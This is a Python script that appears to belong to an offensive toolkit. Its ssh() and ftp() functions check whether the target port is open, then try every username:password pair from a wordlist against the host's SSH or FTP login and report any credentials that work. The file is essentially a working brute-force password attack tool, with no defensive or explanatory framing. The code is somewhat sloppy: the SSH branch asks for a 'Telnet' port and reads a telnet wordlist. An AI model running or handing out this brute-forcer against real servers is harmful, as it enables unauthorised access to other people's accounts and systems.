import paramiko,requests,socket
from ftplib import FTP
import getpass


def ssh(host, port):
    print("1. Default Port (22)")
    print("2. Custom Port")
    choice = int(input(">> "))
    if choice == 2:
        port = int(input("Enter the Custom Telnet Port : "))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        try:
            connect = s.connect_ex((host, port))
            if connect != 0:
                print("[+] Port %s: Closed" %port)
                s.close()

            elif connect == 0:
                print("[+] Port %s: Open" %port)
                s.close()
                wordlist = input("Enter Wordlist location (Press Enter for Default Wordlist) : ")
                if wordlist == '':
                    with open("src/telnet.ini", "r") as f:
                        f1 = f.readlines()
                else:
                    with open(wordlist, "r") as f:
                        f1 = f.readlines()
                for x in f1:
                    y = x.split(':')
                    username = y[0].strip()
                    # Do not print or store password in plaintext
                    password = y[1].strip()
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    print("Checking with Username : %s , Password : [HIDDEN]" % (username))
                    try:
                        ssh.connect(host, port=port, username=username, password=password, timeout=10)
                        flag = 0

                    except paramiko.AuthenticationException:
                        flag = 1

                    except socket.error as e:
                        flag = 2
                        print(e)

                    except KeyboardInterrupt:
                        print("\n User Interrupt! Exitting...")
                        exit()

                    ssh.close()

                    if flag == 0:
                        print('')
                        print("Credentials Found")
                        print("Username : %s" % username)
                        print(("Password : [HIDDEN]"))
                        print('')
                    elif flag == 1:
                        print("Invalid Credentials")

                    else:
                        pass
        except socket.error as e:
            print("Error : %s" %e)

    elif choice == 1 or choice != 2:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        try:
            connect = s.connect_ex((host, 22))
            if connect != 0:
                print("[+] Port 22: Closed")
                s.close()

            elif connect == 0:
                print("[+] Port 22: Open")
                s.close()
                wordlist = input("Enter Wordlist location (Press Enter for Default Wordlist) : ")
                if wordlist == '':
                    with open("src/telnet.ini", "r") as f:
                        f1 = f.readlines()
                else:
                    with open(wordlist, "r") as f:
                        f1 = f.readlines()
                for x in f1:
                    y = x.split(':')
                    username = y[0].strip()
                    # Do not print or store password in plaintext
                    password = y[1].strip()
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    print("Checking with Username : %s , Password : [HIDDEN]" % (username))
                    try:
                        ssh.connect(host, port=22, username=username, password=password, timeout=10)
                        flag = 0

                    except paramiko.AuthenticationException:
                        flag = 1

                    except socket.error as e:
                        flag = 2
                        print(e)

                    except KeyboardInterrupt:
                        print("\n User Interrupt! Exitting...")
                        exit()

                    ssh.close()

                    if flag == 0:
                        print('')
                        print("Credentials Found")
                        print("Username : %s" % username)
                        print(("Password : [HIDDEN]"))
                        print('')
                    elif flag == 1:
                        print("Invalid Credentials")

                    else:
                        pass
        except socket.error as e:
            print("Error : %s" % e)


def ftp(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 21
    s.settimeout(10)
    try:
        connect = s.connect_ex((host, port))
        if connect != 0:
            print("[+] Port %s: Closed" % port)
            s.close()

        elif connect == 0:
            print("[+] Port %s: Open" % port)
            s.close()
            wordlist = input("Enter Wordlist location (Press Enter for Default Wordlist) : ")
            if wordlist == '':
                with open("src/ftp.ini", "r") as f:
                    f1 = f.readlines()
            else:
                with open(wordlist, "r") as f:
                    f1 = f.readlines()
            for x in f1:
                y = x.split(':')
                username = y[0].strip()
                # Do not print or store password in plaintext
                password = y[1].strip()
                ftp = FTP(host)
                print("Checking with Username : %s , Password : [HIDDEN]" % (username))
                try:
                    ftp.login(user=username, passwd=password)
                    flag = 0

                except Exception as e:
                    flag = 1

                except socket.error as e:
                    flag = 2
                    print(e)

                except KeyboardInterrupt:
                    print("\n User Interrupt! Exitting...")
                    exit()

                if flag == 0:
                    print('')
                    print("Credentials Found")
                    print("Username : %s" % username)
                    print("Password : [HIDDEN]")
                    print('')
                elif flag == 1:
                    print("Invalid Credentials")

                else:
                    pass

    except socket.error as e:
        print("Error : %s" % e)
